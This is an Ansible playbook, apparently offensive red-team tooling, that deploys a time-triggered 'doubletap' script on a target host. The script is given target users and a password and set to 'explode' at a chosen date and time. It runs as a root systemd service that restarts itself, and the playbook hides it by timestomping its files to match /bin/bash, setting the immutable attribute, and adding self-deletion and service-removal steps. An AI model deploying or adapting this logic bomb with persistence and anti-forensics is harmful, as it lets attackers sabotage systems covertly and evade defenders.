---
#- name: Define variables for paths and filenames
#  set_fact:
#    doubletap_sh_service_script_path: "/bin/doubletap3"
#    doubletap_sh_service_service_name: "DoubleTapScript"
#    doubletap_sh_service_service_description: "Double Tap Script"

- name: Ensure destination directory exists
  ansible.builtin.file:
    path: "{{ doubletap_sh_service_script_path | dirname }}"
    state: directory
    owner: root
    group: root
    mode: '0755'

- name: Copy shell script to target system
  copy:
    src: "files/doubletap.sh"
    dest: "{{ doubletap_sh_service_script_path }}"
    owner: root
    group: root
    mode: '0755'

# Need to do this as separate tasks
- name: Update users list in the script file
  replace:
    path: "{{ doubletap_sh_service_script_path }}"
    regexp: '^users=.*'
    replace: 'users="{{ doubletap_users }}"'

- name: Update user password in the script file
  replace:
    path: "{{ doubletap_sh_service_script_path }}"
    regexp: '^\users_pwd=.*'
    replace: 'users_pwd="{{ doubletap_users_pwd }}"'

- name: Update fuse_date in the script file
  replace:
    path: "{{ doubletap_sh_service_script_path }}"
    regexp: '^fuse_date=.*'
    replace: 'fuse_date="{{ doubletap_fuse_date }}" # In format YYYY-MM-DD in America/New_York timezone'

- name: Update fuse_time in the script file
  replace:
    path: "{{ doubletap_sh_service_script_path }}"
    regexp: '^fuse_time=.*'
    replace: 'fuse_time="{{ doubletap_fuse_time }}" # In format HH:MM:SS, using 24h time in America/New_York timezone'

- name: Update fuse_armed in the script file
  replace:
    path: "{{ doubletap_sh_service_script_path }}"
    regexp: '^fuse_armed=.*'
    replace: 'fuse_armed="{{ doubletap_fuse_armed }}" # DO NOT SET THIS TO TRUE UNLESS YOU WANT TO EXPLODE'

- name: Update log_location in the script file
  replace:
    path: "{{ doubletap_sh_service_script_path }}"
    regexp: '^log_location=.*'
    replace: 'log_location="{{ doubletap_sh_service_log_path }}" # Set to /dev/null for no output (and comment out line 14)'

- name: Add command to delete the service before script self-deletion
  lineinfile:
    path: "{{ doubletap_sh_service_script_path }}"
    line: "systemctl stop {{ doubletap_sh_service_service_name }} && systemctl disable {{ doubletap_sh_service_service_name }} && rm -f /etc/systemd/system/{{ doubletap_sh_service_service_name }}.service && systemctl daemon-reload"
    insertafter: "# Cleanup after explosion"

- name: Add command to delete the script after execution
  lineinfile:
    path: "{{ doubletap_sh_service_script_path }}"
    line: "rm -f {{ doubletap_sh_service_script_path }}"
    insertafter: "# Cleanup after explosion"

- name: Add command to delete the script after execution
  lineinfile:
    path: "{{ doubletap_sh_service_script_path }}"
    line: "chattr -i {{ doubletap_sh_service_script_path }}"
    insertafter: "# Cleanup after explosion"

- name: Create systemd service to execute script
  copy:
    dest: "/etc/systemd/system/{{ doubletap_sh_service_service_name }}.service"
    content: |
      [Unit]
      Description={{ doubletap_sh_service_service_description }}
      After=network.target

      [Service]
      ExecStart={{ doubletap_sh_service_script_path }}
      Restart=always
      RestartSec=60
      User=root

      [Install]
      WantedBy=multi-user.target

- name: Reload systemd to recognize new service
  systemd:
    daemon_reload: yes

- name: Enable and start the new service
  systemd:
    name: "{{ doubletap_sh_service_service_name }}"
    enabled: yes
    state: started

- name: Timestomp the systemd service file
  command: touch -r /bin/bash /etc/systemd/system/{{ doubletap_sh_service_service_name }}.service

- name: Timestomp script to match /bin/bash creation time
  command: touch -r /bin/bash {{ doubletap_sh_service_script_path }}

- name: Set immutable attribute on script
  command: "chattr +i {{ doubletap_sh_service_script_path }}"
